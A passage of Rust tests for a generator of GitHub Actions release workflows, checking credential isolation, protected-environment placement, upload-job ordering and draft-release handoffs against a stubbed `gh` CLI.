    // two apart: no credential exists on the runner while Intentional's own
    // Action is fetched and executed. Moving the mint earlier would read as a
    // harmless reordering and would silently widen the job's trust boundary, so
    // the order is asserted rather than described. This test constrains mint
    // position only; every_derived_github_app_token_uses_variable_id_and_secret_key
    // in crates/cli/tests/derived_workflows.rs holds the exact mint population.
    #[test]
    fn resolves_every_intentional_action_before_any_credential_is_minted() {
        let workspace = repository_scale_workspace("workflow-credential-order");
        let mut minting_publishers = 0_usize;
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            for (id, steps) in managed_steps(workspace.root(), role) {
                let mint = steps.iter().position(|step| {
                    step.get("uses")
                        .and_then(Value::as_str)
                        .is_some_and(|uses| uses == APP_TOKEN_ACTION)
                });
                let Some(mint) = mint else { continue };
                if id.starts_with("intentional_publish_") {
                    minting_publishers += 1;
                }
                for (index, step) in steps.iter().enumerate() {
                    assert!(
                        intentional_action(step).is_none() || index < mint,
                        "{id} resolves an Intentional Action after minting a credential"
                    );
                }
            }
        }
        assert!(
            minting_publishers > 0,
            "the ordering population includes a publisher that mints a credential"
        );
    }

    /// Non-workflow secrets named anywhere beneath a workflow value.
    fn destination_secret_names(value: &Value) -> BTreeSet<String> {
        let mut names = BTreeSet::new();
        fn visit(value: &Value, names: &mut BTreeSet<String>) {
            match value {
                Value::Mapping(mapping) => {
                    for child in mapping.values() {
                        visit(child, names);
                    }
                }
                Value::Sequence(sequence) => {
                    for child in sequence {
                        visit(child, names);
                    }
                }
                Value::String(text) => {
                    for tail in text.split("secrets.").skip(1) {
                        let name = tail
                            .chars()
                            .take_while(|character| {
                                character.is_ascii_alphanumeric() || *character == '_'
                            })
                            .collect::<String>();
                        if !name.is_empty() && name != "GITHUB_TOKEN" {
                            names.insert(name);
                        }
                    }
                }
                _ => {}
            }
        }
        visit(value, &mut names);
        names
    }

    /// Assert every managed Action in one parsed workflow is credential-isolated.
    fn assert_workflow_action_credential_isolation(
        document: &Value,
        role: WorkflowRole,
    ) -> (usize, BTreeSet<String>) {
        let workflow_secrets = destination_secret_names(&document["env"]);
        let mut actions_swept = 0_usize;
        let mut jobs_reached = BTreeSet::new();
        for (id, body) in document["jobs"].as_mapping().expect("jobs") {
            let Some(id) = id.as_str().filter(|id| id.starts_with("intentional_")) else {
                continue;
            };
            let steps = body["steps"].as_sequence().expect("steps");
            for (index, step) in steps.iter().enumerate() {
                if intentional_action(step).is_none() {
                    continue;
                }
                actions_swept += 1;
                jobs_reached.insert(format!("{role}:{id}"));
                let mut reachable =
                    destination_secret_names(&Value::Sequence(steps[..=index].to_vec()));
                reachable.extend(destination_secret_names(&body["env"]));
                reachable.extend(workflow_secrets.iter().cloned());
                assert!(
                    reachable.is_empty(),
                    "{id} resolves an Intentional Action while a destination secret is reachable: {reachable:?}"
                );
                assert_ne!(
                    body["permissions"]["id-token"].as_str(),
                    Some("write"),
                    "{id} resolves an Intentional Action while OIDC mint authority is reachable"
                );
                assert_ne!(
                    body["permissions"]["packages"].as_str(),
                    Some("write"),
                    "{id} resolves an Intentional Action while package-write authority is reachable"
                );
            }
        }
        (actions_swept, jobs_reached)
    }

    // A repository-local recipe can read a destination secret, persist client
    // authentication, or receive a workflow identity. Once that happens, an
    // Intentional-owned Action in the same job can reach publication authority
    // even when no input passes it the credential. The boundary is reachability:
    // an Action runs before every step that reads a non-workflow secret, and it
    // never shares a workflow or job with an environment secret, or a job with
    // an identity that can be exchanged or written with.
    #[test]
    fn isolates_every_intentional_action_from_publisher_credentials() {
        let workspace = repository_scale_workspace("workflow-credential-reachability");
        let mut actions_swept = 0_usize;
        let mut jobs_reached = BTreeSet::new();
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            let document: Value =
                serde_yaml::from_str(&workflow(workspace.root(), role)).expect("result parses");
            let (swept, reached) = assert_workflow_action_credential_isolation(&document, role);
            actions_swept += swept;
            jobs_reached.extend(reached);
        }
        assert!(
            actions_swept > 0,
            "the reachability population contains Intentional-owned Actions"
        );
        assert!(
            !jobs_reached.is_empty(),
            "the reachability population contains managed jobs"
        );
    }

    #[test]
    #[should_panic(expected = "PUBLISH_TOKEN")]
    fn refuses_a_destination_secret_on_an_intentional_action_input() {
        let document: Value = serde_yaml::from_str(&format!(
            "jobs:\n  intentional_verify:\n    steps:\n      - uses: {ACTION_REPOSITORY}/actions/verify-publication@1.0.0\n        with:\n          registry-password: ${{{{ secrets.PUBLISH_TOKEN }}}}\n"
        ))
        .expect("fixture parses");
        assert_workflow_action_credential_isolation(&document, WorkflowRole::Publish);
    }

    #[test]
    #[should_panic(expected = "PUBLISH_TOKEN")]
    fn refuses_a_job_level_destination_secret_reaching_an_intentional_action() {
        let document: Value = serde_yaml::from_str(&format!(
            "jobs:\n  intentional_verify:\n    env:\n      PUBLISH_TOKEN: ${{{{ secrets.PUBLISH_TOKEN }}}}\n    steps:\n      - uses: {ACTION_REPOSITORY}/actions/verify-publication@1.0.0\n"
        ))
        .expect("fixture parses");
        assert_workflow_action_credential_isolation(&document, WorkflowRole::Publish);
    }

    #[test]
    #[should_panic(expected = "PUBLISH_TOKEN")]
    fn refuses_a_workflow_level_destination_secret_reaching_an_intentional_action() {
        let document: Value = serde_yaml::from_str(&format!(
            "env:\n  PUBLISH_TOKEN: ${{{{ secrets.PUBLISH_TOKEN }}}}\njobs:\n  intentional_verify:\n    steps:\n      - uses: {ACTION_REPOSITORY}/actions/verify-publication@1.0.0\n"
        ))
        .expect("fixture parses");
        assert_workflow_action_credential_isolation(&document, WorkflowRole::Publish);
    }

    // An Action whose recipe already wrote the observation must not run its
    // portable observer over that same path. The subject set comes from the
    // emitted `observe: false` inputs, and each is joined back to the shell step
    // that writes the same observation while holding authentication. A new
    // adapter therefore joins the sweep by choosing inline observation rather
    // than by adding its destination or credential input name to this test.
    #[test]
    fn derives_every_authenticated_observer_from_inline_observation_mode() {
        let workspace = sentinel_workspace("workflow-authenticated-observer-census", None);
        materialize_contract_for_structural_sweep(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");
        let jobs = document["jobs"].as_mapping().expect("jobs");
        let mut authenticated = 0_usize;

        for (job_id, body) in jobs {
            let Some(steps) = body["steps"].as_sequence() else {
                continue;
            };
            for action in steps.iter().filter(|step| {
                intentional_action(step).is_some_and(|(name, _)| name == "verify-publication")
            }) {
                let observation = action["with"]["observation"]
                    .as_str()
                    .expect("the verifier names its observation");
                let observers = jobs
                    .iter()
                    .flat_map(|(candidate_id, candidate)| {
                        candidate["steps"]
                            .as_sequence()
                            .into_iter()
                            .flatten()
                            .map(move |step| (candidate_id, step))
                    })
                    .filter(|(_, step)| {
                        step.get("run").is_some()
                            && step_environment(step)
                                .get("INPUT_OBSERVATION")
                                .is_some_and(|path| path == observation)
                    })
                    .collect::<Vec<_>>();
                let uploads = jobs
                    .iter()
                    .flat_map(|(candidate_id, candidate)| {
                        candidate["steps"]
                            .as_sequence()
                            .into_iter()
                            .flatten()
                            .map(move |step| (candidate_id, step))
                    })
                    .filter(|(_, step)| {
                        step.get("uses").and_then(Value::as_str) == Some(UPLOAD_ARTIFACT_ACTION)
                            && step["with"]["path"].as_str() == Some(observation)
                    })
                    .collect::<Vec<_>>();

                if action["with"]["observe"].as_str() != Some("false") {
                    assert!(
                        observers.is_empty() && uploads.is_empty(),
                        "{job_id:?} leaves portable observation entirely to its Action"
                    );
                    continue;
                }

                authenticated += 1;
                assert_eq!(
                    observers.len(),
                    1,
                    "{job_id:?} has one repository-visible writer for {observation}"
                );
                assert!(
                    !destination_secret_names(observers[0].1).is_empty()
                        || step_environment(observers[0].1)
                            .values()
                            .any(|value| value.contains("secrets.GITHUB_TOKEN")),
                    "{job_id:?} derives inline observation only for an authenticated writer"
                );
                if observers[0].0 == job_id {
                    assert!(
                        uploads.is_empty(),
                        "{job_id:?} needs no artifact when its observer and verifier share a job"
                    );
                    continue;
                }

                assert_eq!(
                    uploads.len(),
                    1,
                    "{job_id:?} receives one transported observation from its separate writer"
                );
                let artifact = uploads[0].1["with"]["name"]
                    .as_str()
                    .expect("the observation upload names its artifact");
                assert!(
                    steps.iter().any(|step| {
                        step.get("uses").and_then(Value::as_str) == Some(DOWNLOAD_ARTIFACT_ACTION)
                            && step["with"]["name"].as_str() == Some(artifact)
                    }),
                    "{job_id:?} downloads the observation artifact {artifact}"
                );
            }
        }
        assert!(
            authenticated > 0,
            "the structural contract contains authenticated observation"
        );
    }

    // The authority transition pushes to the protected default branch using
    // identities the previous step verified. Before this binding existed the
    // step it read produced no outputs at all, so the guard compared the remote
    // head against an empty string and the push resolved empty refs. Asserting
    // that the consumed step is an Action that declares those exact outputs is
    // what makes that shape impossible rather than merely absent.
    #[test]
    fn binds_the_verified_handoff_outputs_to_the_push_step() {
        let workspace = workspace("workflow-identity-binding");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;

        let (verifier, action) = steps
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "verify-handoff")
                    .then(|| (step["id"].as_str().expect("the step is addressable"), name))
            })
            .expect("the authority transition verifies the handoff through the Action");

        let push = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("git push --atomic"))
            })
            .expect("the authority transition pushes");
        let consumed = push["env"]
            .as_mapping()
            .expect("the push step names its inputs")
            .values()
            .filter_map(Value::as_str)
            .filter_map(|value| {
                value
                    .strip_prefix(&format!("${{{{ steps.{verifier}.outputs."))?
                    .strip_suffix(" }}")
                    .map(str::to_owned)
            })
            .collect::<BTreeSet<_>>();

        assert_eq!(
            consumed,
            ["global-tag", "release-sha", "source-sha"]
                .into_iter()
                .map(str::to_owned)
                .collect::<BTreeSet<_>>(),
            "the push step reads the verified identities from the verifying step"
        );
        let declared = action_outputs(&action);
        for key in &consumed {
            assert!(
                declared.contains(key),
                "the {action} Action declares {key}; declared: {declared:?}"
            );
        }
    }

    /// A workspace whose one release unit distributes one subject to two OCI destinations.
    const TWO_DESTINATION_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-2
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    packages:
      package:
        path: .
        oci:
          dockerhub: { repository: example-owner/example-image }
          ghcr: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// A workspace whose one Go release unit publishes to two GoReleaser destinations.
    ///
    /// One packager, two publishers: the shape that proves one build is promoted
    /// to both destinations rather than rebuilt for each. RPM and APT are absent
    /// because the job that uploads their deliverable to the draft Release is
    /// not settled, and the derivation refuses them rather than deriving a
    /// publisher job that publishes nothing.
    const GO_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-2
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    packages:
      package:
        path: .
        homebrew: { repository: example-org/homebrew-tap }
        aur: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// The managed job that places GitHub-hosted deliverables on the draft.
    const UPLOAD_JOB: &str = "intentional_upload_deliverables";

    // `immutable-github-release` gives the upload of a GitHub-hosted deliverable
    // to one repository-local job so that no publisher job holds `contents:
    // write`. The graph that makes that true is the barrier: every build
    // precedes it and every publisher follows it, so a publisher whose consumer
    // path resolves a Release asset finds it there. Both directions are asserted
    // against the derived graph rather than the template, because a job that
    // exists and is not wired in is the failure this prevents.
    #[test]
    fn derives_one_upload_job_every_build_precedes_and_every_publisher_follows() {
        // The mixed workspace is what makes "every build job" mean more than
        // "every build job that produces something for this job to place". A
        // release whose every subject is hosted cannot tell the two apart, and
        // the difference is only inert while a before-publication tag happens to
        // order the rest.
        let workspace = mixed_workspace("workflow-upload-graph");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let needs = job_needs(&jobs, UPLOAD_JOB);
        let builds = job_ids(&jobs, "intentional_build_");
        assert!(
            builds.len() > 1,
            "the release builds a subject this job places and one it does not: {builds:?}"
        );
        assert!(
            builds
                .iter()
                .any(|build| build.contains("library") && build.contains("npm")),
            "one of those builds produces nothing for this job to place: {builds:?}"
        );
        for build in &builds {
            assert!(
                needs.contains(build),
                "the upload job waits for {build}: {needs:?}"
            );
        }
        let publishers = job_ids(&jobs, "intentional_publish_");
        assert!(!publishers.is_empty(), "the release derives a publisher");
        for publisher in &publishers {
            assert!(
                job_needs(&jobs, publisher).contains(&UPLOAD_JOB.to_owned()),
                "{publisher} publishes only once the deliverables are placed"
            );
        }
        assert_eq!(
            job_ids(&jobs, UPLOAD_JOB).len(),
            1,
            "one job holds this authority rather than one per subject"
        );
    }

    // The barrier is unconditional: a publisher follows the upload job whether or
    // not it consumes a Release asset. Wiring it to the handoff instead would be
    // invisible in a release whose every publisher consumes one, so the witness
    // is a release that holds both kinds -- a GoReleaser subject whose publishers
    // read the draft, beside a registry publication that never does.
    #[test]
    fn holds_a_registry_only_publisher_behind_the_barrier_it_reads_nothing_from() {
        let workspace = mixed_workspace("workflow-upload-mixed");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let registry = job_ids(&jobs, "intentional_publish_library_package_npm");
        assert_eq!(
            registry.len(),
            1,
            "the release publishes to a registry as well: {:?}",
            job_ids(&jobs, "intentional_publish_")
        );
        let registry = &registry[0];
        assert!(
            job_steps(&jobs, registry)
                .iter()
                .all(|step| step["with"]["draft-handoff"]
                    .as_str()
                    .is_none_or(str::is_empty)),
            "{registry} consumes no draft asset, which is what makes it the witness"
        );
        assert!(
            job_needs(&jobs, registry).contains(&UPLOAD_JOB.to_owned()),
            "{registry} still follows the barrier: {:?}",
            job_needs(&jobs, registry)
        );

        let consumer = job_ids(&jobs, "intentional_publish_component_package_homebrew");
        assert_eq!(
            consumer.len(),
            1,
            "the release also publishes a draft consumer"
        );
        assert!(
            job_needs(&jobs, &consumer[0]).contains(&UPLOAD_JOB.to_owned()),
            "the consuming publisher follows it too"
        );
    }

    // Repository write authority reaches this job the way it reaches the other
    // two transitions: inside the configured protected environment, through a
    // short-lived installation token minted in the job, and with the workflow's
    // own permissions left read-only.
    #[test]
    fn places_the_deliverables_inside_the_protected_environment_under_a_minted_token() {
        let workspace = go_workspace("workflow-upload-environment");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let body = &jobs[&Value::String(UPLOAD_JOB.to_owned())];

        assert_eq!(
            body["environment"].as_str(),
            Some("intentional-release"),
            "the upload job writes to the Release inside the protected environment"
        );
        assert_eq!(
            body["permissions"]["contents"].as_str(),
            Some("read"),
            "the job's own workflow permissions stay read-only"
        );
        assert!(
            job_steps(&jobs, UPLOAD_JOB).iter().any(|step| step["uses"]
                .as_str()
                .is_some_and(|uses| uses.starts_with("actions/create-github-app-token@"))),
            "the installation token is the sole Release-write authority"
        );
    }

    #[test]
    fn places_every_irreversible_publisher_inside_the_protected_environment() {
        let workspace = repository_scale_workspace("workflow-publisher-environment");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let publishers = job_ids(&jobs, "intentional_publish_");
        assert!(!publishers.is_empty(), "the fixture derives publisher jobs");
        for publisher in publishers {
            assert_eq!(
                jobs[&Value::String(publisher.clone())]["environment"].as_str(),
                Some("intentional-release"),
                "{publisher} performs irreversible external publication behind the configured environment"
            );
        }
    }

    #[test]
    fn binds_every_trusted_publishing_identity_to_the_protected_environment() {
        let workspace = repository_scale_workspace("workflow-trusted-publisher-environment");
        let namespaces = Config::load(workspace.root())
            .expect("repository configuration loads")
            .github
            .expect("repository enables GitHub execution")
            .namespaces()
            .expect("repository namespace resolves");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let mut identity_routes = BTreeSet::new();
        for (id, body) in &jobs {
            if body["permissions"]["id-token"].as_str() != Some("write") {
                continue;
            }
            let text = serde_yaml::to_string(body).expect("job serializes");
            let route = if text.contains("trusted_publishing/tokens") {
                "crates.io"
            } else if text.contains("Prepare the npm client for trusted publishing") {
                "npmjs"
            } else {
                continue;
            };
            let id = id.as_str().expect("job id");
            assert_eq!(
                body["environment"].as_str(),
                Some(namespaces.environment.as_str()),
                "{id} presents its {route} identity from the protected environment named in the registry's trusted-publisher claim set"
            );
            identity_routes.insert(route);
        }
        assert_eq!(
            identity_routes,
            ["crates.io", "npmjs"].into_iter().collect(),
            "the fixture covers both maintained trusted-publishing claim sets"
        );
    }

    // The authority the upload job takes is the authority every publisher job is
    // denied. `withholds_the_workflow_identity_scope_from_repository_destinations`
    // proves no publisher requests the scope; this proves none of them reaches
    // the Release with what it does hold.
    #[test]
    fn leaves_every_release_write_to_the_managed_upload_job() {
        let workspace = go_workspace("workflow-upload-authority");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        for publisher in job_ids(&jobs, "intentional_publish_") {
            let bodies = job_run_bodies(&jobs, &publisher);
            assert!(
                !bodies.contains("gh release"),
                "{publisher} reads its Release asset and never writes one: {bodies}"
            );
        }
        assert!(
            job_run_bodies(&jobs, UPLOAD_JOB).contains("gh release upload"),
            "the upload job is what places the deliverables"
        );
    }

    // A release whose every deliverable reaches a registry has nothing for this
    // job to place, and deriving it regardless would hold repository
    // content-write authority for the duration of an upload with no bytes in it.
    #[test]
    fn derives_no_upload_job_where_every_deliverable_reaches_a_registry() {
        for (label, workspace) in [
            ("npm", npm_workspace("workflow-upload-none-npm")),
            ("oci", two_destination_workspace("workflow-upload-none-oci")),
        ] {
            converge(workspace.root(), WorkflowRole::Publish);
            let jobs = publish_jobs(workspace.root());
            assert!(
                !jobs.contains_key(Value::String(UPLOAD_JOB.to_owned())),
                "{label} places nothing on the Release, so no job holds that authority"
            );
            for publisher in job_ids(&jobs, "intentional_publish_") {
                assert!(
                    !job_needs(&jobs, &publisher).contains(&UPLOAD_JOB.to_owned()),
                    "{label}'s {publisher} does not wait on a job that does not exist"
                );
            }
        }
    }

    // The handoff is an agreement between two jobs across an artifact boundary,
    // and every part of it is a name one side writes and the other reads: the
    // artifact, the directory it unpacks into, and the file the portable command
    // is told to verify. None of those failures is loud -- a download that
    // resolves nothing yields an empty directory and the refusal names the
    // destination three steps later -- so the join is asserted here rather than
    // trusted to two spellings that happen to match.
    #[test]
    fn binds_the_handoff_the_upload_job_writes_to_the_document_its_publisher_reads() {
        let workspace = go_workspace("workflow-upload-handoff-join");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let upload = job_steps(&jobs, UPLOAD_JOB);

        let mut joined = 0_usize;
        for publisher in job_ids(&jobs, "intentional_publish_") {
            let (_, steps, verifier) = publication_verification(&jobs, &publisher);
            let verified = verifier["with"]["draft-handoff"]
                .as_str()
                .expect("the verifier states whether it reads a handoff");
            let expected_artifact = format!(
                "intentional_handoff-{}",
                publisher
                    .strip_prefix("intentional_publish_")
                    .expect("publisher identity suffix")
            );
            let downloaded = steps.iter().find(|step| {
                step["with"]["name"]
                    .as_str()
                    .is_some_and(|name| name == expected_artifact)
            });
            let Some(downloaded) = downloaded else {
                assert!(
                    verified.is_empty(),
                    "{publisher} names a handoff no job hands it: {verified}"
                );
                continue;
            };
            joined += 1;
            let artifact = downloaded["with"]["name"].as_str().expect("artifact name");
            let directory = downloaded["with"]["path"].as_str().expect("artifact path");
            assert_eq!(
                verified,
                format!(
                    "{directory}/{}",
                    crate::publication::draft::DRAFT_HANDOFF_FILE
                ),
                "{publisher} verifies the document its downstream verifier downloaded"
            );

            let produced = upload
                .iter()
                .find(|step| step["with"]["name"].as_str() == Some(artifact))
                .unwrap_or_else(|| panic!("the upload job produces {artifact}"));
            assert_eq!(
                produced["with"]["path"].as_str(),
                Some(directory),
                "{artifact} is packed from the directory the verifier unpacks it into"
            );
            let written = upload
                .iter()
                .filter_map(|step| step["env"]["INTENTIONAL_HANDOFF"].as_str())
                .find(|path| *path == verified);
            assert!(
                written.is_some(),
                "a step writes {verified}, which the downstream verifier checks"
            );
        }
        assert_eq!(
            joined, 2,
            "both draft-dependent publications are joined, not only the first"
        );
    }

    // A deliverable can only be inventoried once it is an asset, so the order is
    // the contract rather than an accident of how the steps were written.
    #[test]
    fn places_every_deliverable_before_the_handoff_that_inventories_it() {
        let workspace = go_workspace("workflow-upload-order");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let names = job_steps(&jobs, UPLOAD_JOB)
            .iter()
            .filter_map(|step| step["name"].as_str().map(str::to_owned))
            .collect::<Vec<_>>();

        let placed = names
            .iter()
            .position(|name| name.contains("deliverables to the draft Release"))
            .expect("the job places the deliverables");
        let inventoried = names
            .iter()
            .position(|name| name.contains("draft-asset handoff"))
            .expect("the job writes a handoff");
        assert!(
            placed < inventoried,
            "the handoff is written from a draft that already carries the assets: {names:?}"
        );
    }

    /// The distribution tree a GoReleaser build hands the upload job.
    ///
    /// Two archives and a checksum file are what a Homebrew formula and an Arch
    /// `PKGBUILD` resolve; the `.deb` and `.rpm` are what the system-package
    /// adapters distribute; `artifacts.json` is the packager's own record of its
    /// run; and the formula and package sources are descriptors their publisher
    /// jobs promote into repositories. One fixture carries all five kinds so a
    /// selection rule that admitted or dropped the wrong one is visible.
    const GO_DISTRIBUTION: [(&str, &str); 11] = [
        // No two of these carry the same number of bytes, and the stub serves a
        // media type derived from each name. A fixture whose files agree on
        // either cannot witness a document that records one asset's size or
        // media type against another's name.
        (
            "example-tool_1.0.0_linux_amd64.tar.gz",
            "linux amd64 archive bytes",
        ),
        (
            "example-tool_1.0.0_linux_arm64.tar.gz",
            "linux arm64 archive",
        ),
        ("checksums.txt", "the published checksums"),
        ("example-tool_1.0.0_amd64.deb", "the Debian package"),
        ("example-tool-1.0.0.x86_64.rpm", "the RPM package"),
        ("example-tool_1.0.0_x86_64.apk", "the Alpine package"),
        (
            "example-tool-1.0.0-1-x86_64.pkg.tar.zst",
            "the Arch package",
        ),
        // All three documents the packager writes about its own run are staged,
        // because the rule that excludes them names all three and a fixture
        // carrying one witnesses only one of those exclusions.
        ("artifacts.json", "[]"),
        ("metadata.json", "{}"),
        ("config.yaml", "version: 2"),
        ("homebrew/Formula/example-tool.rb", "class ExampleTool"),
    ];

    /// Assets a Homebrew or Arch publication resolves from the draft Release.
    const CONSUMED_ASSETS: [&str; 3] = [
        "checksums.txt",
        "example-tool_1.0.0_linux_amd64.tar.gz",
        "example-tool_1.0.0_linux_arm64.tar.gz",
    ];

    /// Deliverables the upload job places, in the order it places them.
    const PLACED_ASSETS: [&str; 7] = [
        "checksums.txt",
        "example-tool-1.0.0-1-x86_64.pkg.tar.zst",
        "example-tool-1.0.0.x86_64.rpm",
        "example-tool_1.0.0_amd64.deb",
        "example-tool_1.0.0_linux_amd64.tar.gz",
        "example-tool_1.0.0_linux_arm64.tar.gz",
        "example-tool_1.0.0_x86_64.apk",
    ];

    /// Lay one built subject's transported bytes out where the job reads them.
    fn stage_subject(directory: &Path) {
        for (relative, contents) in GO_DISTRIBUTION {
            let path = directory.join(relative);
            std::fs::create_dir_all(path.parent().expect("parent")).expect("subject directory");
            std::fs::write(&path, contents).expect("subject file");
        }
    }

    /// Release identity the stand-in verify job proves for the upload job.
    const UPLOAD_TAG: &str = "component/staged@1.1.0";
    const UPLOAD_SOURCE: &str = "0000000000000000000000000000000000000000";
    const UPLOAD_RELEASE: &str = "1111111111111111111111111111111111111111";
    const UPLOAD_PLAN_DIGEST: &str =
        "sha256:3333333333333333333333333333333333333333333333333333333333333333";
    /// Stable GitHub identifier of the draft the stub serves.
    const UPLOAD_RELEASE_ID: &str = "4242";

    /// A `gh` stub that keeps the draft's asset inventory in a shared file.
    ///
    /// The inventory is what the handoff step reads back, so it is served rather
    /// than predicted: a name reaches it only because an upload placed it, and
    /// its identifier is the store's rather than anything the derivation chose.
    const GH_RELEASE_STUB: &str = r#"#!/usr/bin/env bash
printf '%s\n' "$*" >> "${GH_STUB_LOG}"
touch "${GH_STUB_ASSETS}"
media_type() {
  if [ -n "${GH_STUB_MEDIA}" ]; then printf '%s' "${GH_STUB_MEDIA}"; return; fi
  case "$1" in
    *.tar.gz) printf 'application/gzip' ;;
    *.tar.zst) printf 'application/zstd' ;;
    *.deb) printf 'application/vnd.debian.binary-package' ;;
    *.rpm) printf 'application/x-rpm' ;;
    *.apk) printf 'application/vnd.android.package-archive' ;;
    *) printf 'text/plain' ;;
  esac
}
case "$1 $2" in
  "release view")
    if [ "${GH_STUB_RESOLVES}" != yes ]; then
      printf 'HTTP 503: Service Unavailable\n' >&2
      exit 1
    fi
    printf '%s\t%s\t%s\n' "${GH_STUB_DRAFT}" "${GH_STUB_TAG}" "${GH_STUB_RELEASE}"
    ;;
  "release upload")
    for candidate in "$@"; do
      [ -f "${candidate}" ] || continue
      name="$(basename "${candidate}")"
      if awk -F'\t' -v n="${name}" '$1 == n { held = 1 } END { exit !held }' "${GH_STUB_ASSETS}"; then
        continue
      fi
      printf '%s\t%s\t%s\t%s\n' "${name}" \
        "$(( $(wc -l < "${GH_STUB_ASSETS}") + 100 ))" \
        "$(wc -c < "${candidate}")" "$(media_type "${name}")" >> "${GH_STUB_ASSETS}"
    done
    ;;
  "api --paginate")
    cat "${GH_STUB_ASSETS}"
    ;;
esac
exit 0
"#;

    /// A stand-in runner serving one draft, with the built subject already on it.
    fn upload_runner(label: &str, inventory: &Path) -> StubRunner {
        let runner = StubRunner::new(label)
            .stub("gh", GH_RELEASE_STUB)
            .setting("GH_STUB_ASSETS", &inventory.display().to_string())
            .setting("GH_STUB_RESOLVES", "yes")
            .setting("GH_STUB_DRAFT", "true")
            .setting("GH_STUB_TAG", UPLOAD_TAG)
            .setting("GH_STUB_RELEASE", UPLOAD_RELEASE_ID)
            .setting("GH_STUB_MEDIA", "");
        stage_subject(
            &runner
                .temp()
                .join("intentional_subject/intentional_subject-component_goreleaser/bytes"),
        );
        runner
    }

    /// Every `run:` body of the derived upload job, in the order a runner takes them.
    fn upload_scripts(root: &Path, runner: &StubRunner) -> Vec<(String, BTreeMap<String, String>)> {
        let mut bindings = runner.contexts();
        bindings.insert(
            "${{ steps.intentional_token.outputs.token }}".to_owned(),
            "stub-installation-token".to_owned(),
        );
        for (name, value) in [
            ("global-tag", UPLOAD_TAG),
            ("source-sha", UPLOAD_SOURCE),
            ("release-sha", UPLOAD_RELEASE),
            ("plan-digest", UPLOAD_PLAN_DIGEST),
        ] {
            bindings.insert(
                format!("${{{{ needs.intentional_verify_tag.outputs.{name} }}}}"),
                value.to_owned(),
            );
        }
        managed_steps(root, WorkflowRole::Publish)
            .into_iter()
            .find(|(id, _)| id == UPLOAD_JOB)
            .expect("the upload job is derived")
            .1
            .iter()
            .filter(|step| step.get("run").is_some())
            .map(|step| {
                (
                    step["run"].as_str().expect("a script").to_owned(),
                    resolved_environment(step, &bindings, "upload"),
                )
            })
            .collect()
    }

    /// Run every step of the derived upload job, stopping at the first failure.
    fn run_upload_job(root: &Path, runner: &StubRunner) -> Executed {
        let mut last = Executed {
            succeeded: true,
            invocations: String::new(),
            diagnostics: String::new(),
        };
        for (script, environment) in upload_scripts(root, runner) {
            last = runner.execute(&script, &environment);
            if !last.succeeded {
                break;
            }
        }
        last
    }

    /// One handoff the executed job wrote, parsed through its own contract.
    fn written_handoff(
        runner: &StubRunner,
        slug: &str,
    ) -> crate::publication::draft::DraftReleaseAssetHandoff {
        let path = runner.temp().join(format!(
            "intentional_handoff/{slug}/{}",
            crate::publication::draft::DRAFT_HANDOFF_FILE
        ));
        let text = std::fs::read_to_string(&path)
            .unwrap_or_else(|error| panic!("{} was written: {error}", path.display()));
        crate::publication::draft::DraftReleaseAssetHandoff::from_yaml(&text)
            .unwrap_or_else(|error| panic!("the handoff its consumer parses:\n{text}\n{error}"))
    }

    // The job is executed rather than read. What it uploads, and what the
    // document it leaves behind says, are decided by shell running against a
    // live inventory, and no reading of the template shows either. The document
    // is parsed through the same contract the consuming publisher parses it
    // with, so a member this job spells differently is a failure here rather
    // than on a release runner.
    #[test]
    fn places_the_built_deliverables_and_hands_off_what_each_publication_consumes() {
        let workspace = go_workspace("workflow-upload-execute");
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new("workflow-upload-execute-inventory");
        let runner = upload_runner(
            "workflow-upload-execute-runner",
            &inventory.root().join("assets"),
        );

        let executed = run_upload_job(workspace.root(), &runner);
        assert!(
            executed.succeeded,
            "the upload job completes: {}",
            executed.diagnostics
        );

        let placed = executed
            .invocations
            .lines()
            .find(|line| line.starts_with("release upload"))
            .expect("the job uploads the deliverables");
        for asset in PLACED_ASSETS {
            assert!(
                placed.contains(asset),
                "{asset} is a GitHub-hosted deliverable: {placed}"
            );
        }
        for excluded in ["artifacts.json", "example-tool.rb"] {
            assert!(
                !placed.contains(excluded),
                "{excluded} is not a deliverable a consumer resolves: {placed}"
            );
        }
        assert!(
            placed.contains("--clobber"),
            "a rerun replaces what it already placed: {placed}"
        );

        // Every member but the digest is read back from the draft rather than
        // predicted, so each is compared against the inventory the Release
        // served rather than against a value this test also chose.
